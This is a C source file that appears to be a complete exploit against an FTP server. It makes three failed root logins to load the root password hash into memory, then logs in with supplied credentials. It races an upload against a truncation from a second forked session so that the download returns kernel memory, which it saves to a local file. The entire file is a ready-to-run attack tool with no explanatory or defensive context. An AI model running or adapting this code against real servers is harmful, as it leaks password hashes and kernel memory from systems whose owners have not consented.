#include <stdio.h>  

#include <stdlib.h>  

#include <string.h>  

#include <unistd.h>  

#include <sys/types.h>  

#include <netinet/in.h>  

#include <sys/socket.h>  

#include <netdb.h>  

#include <fcntl.h>  

#include <unistd.h>  

   

int createconnection(char *target, char *targetport);  

void getline(int s);  

void putline(int s, char *out);  

void usage(char *exe);  

   

char in[8096];  

char out[8096];  

char out2[8096];  

   

int main(int argc, char *argv[]) {  

 extern int optind;  

 extern char *optarg;  

 int s,s2,s3,s4,nsock,nsock2;  

 int c,k,len;  

 int fd,lockfd;  

 int total_kmem_size=0;  

     

 char *target = NULL;  

 char *username = NULL;  

 char *password = NULL;  

 char *writeto = ".";  

 char *targetport = "21";  

 char *myip = NULL;  

 char *myip2 = NULL;  

 char *myip3 = NULL;  

 int octet_in[4], port;  

 struct sockaddr_in yo, yo2, cli, cli2;  

 char *oct = NULL;   

    

 while ((c = getopt(argc, argv, "h:i:p:l:k:d:s:")) != EOF) {  

  switch(c) {  

  case 'h':  

    target = (char*)malloc(strlen(optarg)+1);  

    strcpy(target, optarg);  

  break;  

  case 'i':  

    myip = (char*)malloc(strlen(optarg)+1);  

    strcpy(myip, optarg);  

    myip2 = (char*)malloc(strlen(optarg)+1);  

    strcpy(myip2, optarg);  

    myip3 = (char*)malloc(strlen(optarg)+1);  

    strcpy(myip3, optarg);  

  break;  

  case 'p':  

    targetport = (char*)malloc(strlen(optarg)+1);  

    strcpy(targetport, optarg);  

  break;  

  case 'l':  

    username = (char*)malloc(strlen(optarg)+1);  

    strcpy(username, optarg);  

  break;  

  case 'k':  

    password = (char*)malloc(strlen(optarg)+1);  

    strcpy(password, optarg);  

  break;  

  case 'd':  

    writeto = (char*)malloc(strlen(optarg)+1);  

    strcpy(writeto, optarg);  

  break;  

  case 's':  

    total_kmem_size = atoi(optarg);  

  break;  

   

  default:  

    usage(argv[0]);  

  }  

 }  

    

 if (target == NULL || myip == NULL)  

  usage(argv[0]);  

   

 if (total_kmem_size < 10) {  

  printf("size must be greater or equal 10.\n");  

  usage(argv[0]);  

 }  

    

 if (username == NULL || password == NULL) {  

  usage(argv[0]);  

 }  

    

 s = createconnection(target, targetport);  

 getline(s);   

   

 fprintf(stderr, "populating root hash in memory...\n");  

    

 for (k=0;k<3;k++) {  

  snprintf(out, sizeof out, "USER root\r\n");  

  putline(s, out);  

  getline(s);  

  snprintf(out, sizeof out, "PASS abcdef\r\n");  

  putline(s,out);  

  getline(s);  

 }  

   

 fprintf(stderr, "logging in...\n");  

    

 snprintf(out, sizeof out, "USER %s\r\n", username);  

 putline(s, out);  

 getline(s);  

 snprintf(out, sizeof out, "PASS %s\r\n", password);  

 putline(s,out);  

 getline(s);  

    

 fprintf(stderr, "changing to writeable directory...\n");  

    

 snprintf(out, sizeof out, "CWD %s\r\n", writeto);  

 putline(s, out);  

 getline(s);  

   

 fprintf(stderr, "putting file. this may take some time (%dMB)...\n", total_kmem_size);  

   

 snprintf(out, sizeof out, "TYPE I\r\n");  

 putline(s, out);  

 getline(s);  

    

 port = getpid() + 2048;  

 len = sizeof(cli);  

    

 bzero(&yo, sizeof(yo));  

 yo.sin_family = AF_INET;  

 yo.sin_port=htons(port);  

 yo.sin_addr.s_addr = htonl(INADDR_ANY);  

    

 oct=(char *)strtok(myip,".");  

 octet_in[0]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[1]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[2]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[3]=atoi(oct);  

    

 snprintf(out, sizeof out, "PORT %d,%d,%d,%d,%d,%d\r\n", octet_in[0], octet_in[1], octet_in[2], octet_in[3], port / 256, port % 256);  

 putline(s, out);  

 getline(s);  

    

 if ((s2=socket(AF_INET, SOCK_STREAM, 0)) < 0) {  

  perror("socket");  

  return -1;  

 }  

    

 if ((bind(s2, (struct sockaddr *) &yo, sizeof(yo))) < 0) {  

  perror("bind");  

  close(s2);  

  exit(1);  

 }  

    

 if (listen(s2, 10) < 0) {  

  perror("listen");  

  close(s2);  

  exit(1);  

 }  

    

 snprintf(out, sizeof out, "STOR kernelmemory\r\n");  

 putline(s, out);  

 getline(s);  

    

 sleep(1);  

    

 if ((nsock = accept(s2, (struct sockaddr *)&cli, &len)) < 0) {  

  perror("accept");  

  close(s);  

  exit(1);  

 }  

   

   

 k=0;  

   

 char *out3=NULL;  

 out3 = (char*)malloc(1024*1024*10);  

 if (out3 == NULL) {  

  perror("malloc");  

  exit(0);  

 }  

   

 memset(out3, 'C', 10*1024*1024);  

   

 do {  

  k += write(nsock, out3, 10*1024*1024);  

  if (k % 1000 == 0)  

   fprintf(stderr, "\r\r\r%d|%d            ", k, total_kmem_size * 1024 * 1024);  

 } while (k < total_kmem_size * 1024 * 1024);  

    

 free(out3);  

   

 close(nsock);  

 close(fd);  

 getline(s);  

   

 fprintf(stderr, "getting file...\n");  

 fprintf(stderr, "forking truncate process into background.\n");  

   

 unlink("exploit.lck");  

   

 if (fork() == 0) {  

  fprintf(stderr, "=====START TRUNCATE FILE PROCESS ======\n");  

  s3 = createconnection(target, targetport);  

  getline(s3);  

   

  snprintf(out, sizeof out, "USER %s\r\n", username);  

  putline(s3, out);  

  getline(s3);  

  snprintf(out, sizeof out, "PASS %s\r\n", password);  

  putline(s3,out);  

  getline(s3);  

   

  while(1) {  

    if (open("exploit.lck", O_RDONLY) > 0) {  

        break;  

    }  

  }  

   

 snprintf(out, sizeof out, "TYPE I\r\n");  

 putline(s3, out);  

 getline(s3);  

    

 port = getpid() + 4000;  

 len = sizeof(cli2);  

    

 bzero(&yo2, sizeof(yo2));  

 yo2.sin_family = AF_INET;  

 yo2.sin_port=htons(port);  

 yo2.sin_addr.s_addr = htonl(INADDR_ANY);  

    

 oct=(char *)strtok(myip3,".");  

 octet_in[0]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[1]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[2]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[3]=atoi(oct);  

    

 snprintf(out, sizeof out, "PORT %d,%d,%d,%d,%d,%d\r\n", octet_in[0], octet_in[1], octet_in[2], octet_in[3], port / 256, port % 256);  

 putline(s3, out);  

 getline(s3);  

    

 if ((s4=socket(AF_INET, SOCK_STREAM, 0)) < 0) {  

  perror("socket");  

  return -1;  

 }  

    

 if ((bind(s4, (struct sockaddr *) &yo2, sizeof(yo2))) < 0) {  

  perror("bind");  

  close(s3);  

  exit(1);  

 }  

    

 if (listen(s4, 10) < 0) {  

  perror("listen");  

  close(s2);  

  exit(1);  

 }  

    

 snprintf(out, sizeof out, "STOR kernelmemory\r\n");  

 putline(s3, out);  

 getline(s3);  

    

 sleep(1);  

    

 if ((nsock2 = accept(s4, (struct sockaddr *)&cli2, &len)) < 0) {  

  perror("accept");  

  close(s);  

  exit(1);  

 }  

   

 close(nsock2);  

 close(fd);  

   

  close(s4);  

  fprintf(stderr, "=====END TRUNCATE FILE PROCESS ======\n\n");  

  fprintf(stderr, "Wait for the download to complete...\n");    

   

  while(1);  

 }  

   

 snprintf(out, sizeof out, "REST 0\r\n");  

 putline(s, out);  

 getline(s);  

   

 snprintf(out, sizeof out, "TYPE I\r\n");  

 putline(s, out);  

 getline(s);  

    

 port = getpid() + 1024;  

 len = sizeof(cli);  

    

 bzero(&yo, sizeof(yo));  

 yo.sin_family = AF_INET;  

 yo.sin_port=htons(port);  

 yo.sin_addr.s_addr = htonl(INADDR_ANY);  

    

 oct=(char *)strtok(myip2,".");  

 octet_in[0]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[1]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[2]=atoi(oct);  

 oct=(char *)strtok(NULL,".");  

 octet_in[3]=atoi(oct);  

    

 snprintf(out, sizeof out, "PORT %d,%d,%d,%d,%d,%d\r\n", octet_in[0], octet_in[1], octet_in[2], octet_in[3], port / 256, port % 256);  

 putline(s, out);  

 getline(s);  

    

 if ((s2=socket(AF_INET, SOCK_STREAM, 0)) < 0) {  

  perror("socket");  

  return -1;  

 }  

    

 if ((bind(s2, (struct sockaddr *) &yo, sizeof(yo))) < 0) {  

  perror("bind");  

  close(s2);  

  exit(1);  

 }  

    

 if (listen(s2, 10) < 0) {  

  perror("listen");  

  close(s2);  

  exit(1);  

 }  

   

 snprintf(out, sizeof out, "CWD %s\r\n", writeto);  

 putline(s, out);  

 getline(s);  

   

 snprintf(out, sizeof out, "RETR kernelmemory\r\n");  

 putline(s, out);  

 getline(s);  

   

 sprintf(out, "kernelmemory.%d", getpid());  

 fprintf(stderr, "saving kernel memory to >>> %s <<<\n", out);  

   

 fd = open(out, O_WRONLY | O_CREAT, 0777);  

 if (fd == -1) {  

  perror("open on local 'kernelmemory' file");  

  close(s);  

  exit(1);  

 }  

    

 sleep(1);  

    

 if ((nsock = accept(s2, (struct sockaddr *)&cli, &len)) < 0) {  

  perror("accept");  

  close(s);  

  exit(1);  

 }  

    

 int k2=0;  

 char *in2 = (char*)malloc(1024*1024*10);  

 if (in2 == NULL) {  

  perror("malloc");  

  exit(0);  

 }  

 do {  

  k = recv(nsock, in2, 1024*1024*10, 0);  

  if (k < 1) break;  

  k2+=k;  

//  if (k2 % 1000 == 0)  

   fprintf(stderr, "\r\r\rREAD=%d BYTES       ", k2);  

   

  if (k2 > 1024) {  

    lockfd = open("exploit.lck", O_CREAT|O_RDWR, 0777);  

    sleep(1);  

    close(lockfd);  

  }  

  write(fd, in2, k);  

 } while (k > 0);  

   

 free(in2);  

   

 getline(s);  

   

 close(nsock);  

 close(fd);  

 close(s);    

    

}  

   

int createconnection(char *target, char *targetport) {  

 struct addrinfo hints, *res;  

 int s;  

    

 memset(&hints, 0, sizeof hints);  

 hints.ai_family = AF_UNSPEC;  

 hints.ai_socktype = SOCK_STREAM;  

    

 if (getaddrinfo(target, targetport, &hints, &res)) {  

  perror("getaddrinfo");  

  exit(1);  

 }  

    

 s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);  

 if (s < 0) {  

  perror("socket");  

  exit(1);    

 }  

    

 if (connect(s, res->ai_addr, res->ai_addrlen) < 0) {  

  perror("connect");  

  exit(1);  

 }  

    

 return s;  

}  

   

void getline(int s)  

{  

 memset(in, '\0', sizeof in);  

 if (recv(s, in, sizeof in, 0) < 1) {  

  perror("recv");  

  close(s);  

  exit(1);  

 }  

    

 fprintf(stderr, "<\t%s", in);  

}  

    

void putline(int s, char *out) {  

 fprintf(stderr, ">\t%s", out);  

    

 if (send(s, out, strlen(out), 0) == -1) {  

  perror("send");  

  close(s);  

  exit(1);  

 }  

}  

   

void usage(char *exe)  

{  

 fprintf(stderr, "%s <-h host> <-i your internal ip> <-s size in MB to read from kernel> [-p port] <-l username> <-k password>" 

 " [-d writable directory] \n",  

exe);  

 exit(0);  

}
